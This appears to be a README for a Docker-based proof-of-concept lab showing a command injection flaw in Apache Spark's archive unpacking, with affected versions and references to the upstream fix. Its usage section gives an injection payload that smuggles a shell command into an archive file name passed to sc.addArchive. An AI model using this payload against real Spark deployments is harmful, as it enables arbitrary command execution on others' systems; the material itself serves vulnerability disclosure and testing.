# Spark Shell Cmd Injection Vulnearability

## Introduction

The [unTarUsingTar](https://github.com/apache/hadoop/blob/trunk/hadoop-common-project/hadoop-common/src/main/java/org/apache/hadoop/fs/FileUtil.java#L904) method of hadoop was used in spark to extract the archived file in `core/src/main/scala/org/apache/spark/util/Utils#unpack`. In no `windows` platform, it may leading command injection.

Impact version:

```
Spark < 3.1.3
Spark < 3.2.2
```

## Usage

Start the container

```bash
docker-compse up
```

attach to the shell of container and run `spark-shell`, input

```bash
sc.addArchive("/`{command}`&&poc.tar")
```

![poc](images/poc.jpg)

## Reference

1. https://github.com/apache/spark/commit/057c051285ec32c665fb458d0670c1c16ba536b2
2. https://github.com/apache/spark/tree/057c051285ec32c665fb458d0670c1c16ba536b2
3. https://github.com/apache/spark/pull/35946